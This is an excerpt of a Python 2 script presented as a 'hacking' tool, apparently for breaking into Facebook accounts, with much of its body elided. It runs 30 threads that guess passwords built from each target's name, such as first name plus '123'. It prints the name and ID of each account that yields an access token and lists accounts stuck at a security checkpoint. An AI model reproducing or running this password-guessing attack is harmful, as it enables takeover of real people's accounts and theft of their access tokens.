...
logo = """
  ooooooooooooo                              
  8'.      888          `8                              
            888       .ooooo.   .ooooo.  oooo d8b
            888      d88' `88b d88' `88b `888""8P 
            888      888   888 888   888  888
            888      888   888 888   888  888
         o888o  `Y8bod8P' `Y8bod8P' d888b
                                               
ooooo      ooo                       o8o           
`888b.     `8'                       `"'          
  8 `88b.    8   .oooo.     oooooooo oooo  oooo d8b 
  8   `88b.  8  `P  )88b   d'""7d8P  `888  `888""8P 
 8     `88b.8   .oP"888     .d8P'    888   888 
 8       `888  d8(  888   .d8P'  .P  888   888
 o8o        `8  `Y888""8o d8888888P  o888o d888b
...
def menu():
	...
	print "\033[1;36;40m      ╚═════════════════════════════════╝"
	print "    \033[1;32;40m[Type1] \033[1;33;40m>>Clone With Nazir Tools"	
	print "    \033[1;32;40m[type2] \033[1;33;40m >>Load Update"																														
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•══════•◈•\033[1;91mRanaNadeem\033[1;97m•◈•══════•◈•"
		...
		print "\033[1;92m•◈•══════••◈•\033[1;91mRanaNadeem\033[1;95m•◈•══════••◈•"
		try:
	...
	print "\033[1;36;40m[Hacking] Total IDs : \033[1;94m"+str(len(id))
	print('\033[1;34;40m[Cracking] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[😈] Hacking\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m     ♕︎    \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ♕︎"
	print "   \033[1;92m»»Demand By Sana Khan,,,Ahtesham Khan,,,Rana Bilal,,,Saim Rajpoot««««««««"

	print('           \033[1;91m»»»Nazir »»Tool start cloning Wait...')
	print  "  \033[1;92m»»»»»»»»»»»»»»»»»»»»»»Nazir KHaN««««««««««««««««»»««««««««" 
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m❤️\x1b[1;92m[Nazir,Hack✪]'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m❤️\x1b[1;94m[Nazir,CP]'
				    ...
				    pass2 = b['first_name'] + '123'										
			            ...
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;94m❤︎\x1b[1;92m[Nazir,Hack✪]'											
				            print '\x1b[1;94m\x1b[1;91mName \x1b[1;91m    \x1b[1;92m' + b['name']											
				            print '\x1b[1;94m\x1b[1;91mID \x1b[1;91m      \x1b[1;92m' + user								
						                       ...
						                       if 'access_token' in q:	
						                               ...
						                               oks.append(user+pass5)	
										                           ...
										                           pass8 = b['last_name'] + '786'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;94m❤︎\x1b[1;92m[Rana,Hack✪]'											
				                                                                                   print '\x1b[1;94m\x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']											
				                                                                                   print '\x1b[1;94m\x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user										
				                                                                                   ...
				                                                                                   oks.append(user+pass8)
			                                                                                           ...
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;94m❤︎\x1b[1;94m[Nazir,CP]'
				                                                                                       print '\x1b[1;94m\x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                       print '\x1b[1;94m\x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m------------------------------------------»\033[1;91mRanaNadeem\033[1;95m«-----------------------------------------------------"
	print "  \033[1;91m➪➪➪➪➪Creator Nazir KhaN☜︎︎︎" #Dev:AjMaL
	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Nadeem786.py)↩\033[1;97m....'
	print"\033[1;91mTotal Rana,Hack/\x1b[1;95mRana,CP\033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print logo
